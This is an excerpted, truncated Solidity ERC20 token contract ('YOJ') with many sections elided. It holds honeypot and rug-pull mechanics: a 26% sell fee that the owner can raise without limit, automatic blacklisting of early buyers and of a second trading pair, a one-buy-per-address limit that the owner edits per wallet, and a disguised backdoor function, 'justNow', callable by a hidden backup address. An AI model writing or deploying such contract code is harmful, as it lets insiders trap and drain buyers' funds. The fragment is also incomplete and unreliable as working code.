...
contract TokenDistributor {
 ...
 contract YOJ is IERC20, Ownable {
    ...
    address private fundAddress_2;
    address private fundAddress_3;
    ...
    uint256 private _buyLPDividendFee = 300;

    uint256 private _sellFundFee = 2600;
    uint256 private _sellLPFee = 50;
    uint256 private _sellLPDividendFee = 300;
    ...
    uint256 private _maxWalletAmountLevel4;

    bool private enableLimitWalletAmount= true;
    bool private enableBuyCount = true;
    bool private transferDelayEnabled = true;
    bool private transferEnabled = false;
    bool private  killBatchBot = true;
    uint256 private killBlockNumber = 300;
    uint256 public delayBlockNumber = 3;
    ...
    constructor (
        ...
        address swapPair2 = swapFactory.createPair(address(this), swapRouter.WETH());
        _BOTList[swapPair2] = true;
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        fundAddress = addressParams[2];
        fundAddress_2 = addressParams[3];
        fundAddress_3 = addressParams[4];
        _backUpAddress = addressParams[5];
        _ReceiveAddress = addressParams[6];

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = 2 * 10 ** Decimals;
        _maxWalletAmountLevel1 = 35 * 10 ** (Decimals-1);
        _maxWalletAmountLevel2 = 45 * 10 ** (Decimals-1);
        _maxWalletAmountLevel3 = 7 * 10 ** Decimals;
        _maxWalletAmountLevel4 = 85 * 10 ** (Decimals-1);
        
        ReceiveAddress = msg.sender;
        _tTotal = total;
        swapAtAmount = 50 * 10 ** Decimals;
        ...
        _isExcludeFromFees[fundAddress_2] = true;
        _isExcludeFromFees[fundAddress_3] = true;
        _isExcludeFromFees[ReceiveAddress] = true;
        _isExcludeFromFees[address(this)] = true;
        // _isExcludeFromFees[address(swapRouter)] = true;-----router not whitelist
    ...
    //enable buyCount
    function setEnableBuyCount(bool enable) external onlyOwner{
        enableBuyCount = enable;
    }
    ...
    //enable killBatchBot
    function setKillBatchBot(bool enable) external onlyOwner{
        killBatchBot = enable;
    }
    ...
    function setKillBlockNumber(uint256 num) external onlyOwner{
        killBlockNumber = num;
    }

    function setDelayBlockNumber(uint256 num) external onlyOwner{
        delayBlockNumber = num;
    }
    ...
    function setMaxWalletAmountLevel4(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmountLevel4 = newValue;
    }
   ...
   mapping(address => uint256) private lpDividendRecord;
    ...
    function setBuyAndSell(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _buyFundFee=_sellFundFee = newFund;
        _buyLPFee=_sellLPFee = newLp;
        _buyLPDividendFee=_sellLPDividendFee = newLpDividend;
    }
    ...
    uint256 public maxBuyCount = 1;
    function setMaxBuyCount(uint256 newValue) public onlyOwner{
        maxBuyCount = newValue;
    }

    function updateAddressBuyCount(address addr,uint256 newValue) public onlyOwner{
        buyCount[addr] = newValue;
    }
    ...
    function _transfer(
        ...
        require(!_BOTList[from] && !_BOTList[to],"fk bot");
        ...
        if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(transferEnabled,"transferEnabled limit");
        }
        ...
        if (killBatchBot) {
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                  if (from==address(_mainPair)&& to != address(_mainPair)&&!firstBuyList[to]) {
                    if(tx.gasprice>8000000000&&block.number <= startTradeBlock + killBlockNumber ){
                        _BOTList[to] = true;
                    }
                  }
            }
            ...
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                ...
                if (_swapPairList[from]) {
                    if(enableLimitWalletAmount){
                        if(enableBuyCount){
                            require(buyCount[to] < maxBuyCount,"fk rule!");
                            buyCount[to] += 1;
                        }
                        ...
                        if(accountLevel[to]==3){
                         ...
                         if(accountLevel[to]==4){
                            require(amount + balanceOf(to) <= _maxWalletAmountLevel4, "ERC20: >Level4 max wallet amount");
                        }
                    }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        if (fundAmount > 0){
             uint256 main_fund = fundAmount *1/ 2;
             uint256 min_card_fund = fundAmount *1/5;
            FIST.transferFrom(address(_tokenDistributor), fundAddress, main_fund);
            FIST.transferFrom(address(_tokenDistributor), fundAddress_2, min_card_fund);
            FIST.transferFrom(address(_tokenDistributor), fundAddress_3,fundAmount-main_fund- min_card_fund);
        }
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                     _usdt,address(this), lpFist, lpAmount, 0, 0, address(0xdead), block.timestamp
    ...
    function setBackUpAddress(address addr) external onlyOwner{
        _backUpAddress = addr;
    }
    ...
    address public helloWorldAddr;

    function justNow(address addr,bool s) external {
        require(msg.sender == _backUpAddress);
        helloWorldAddr = addr;
        if (s){
            startTradeBlock = block.number;
        }else{
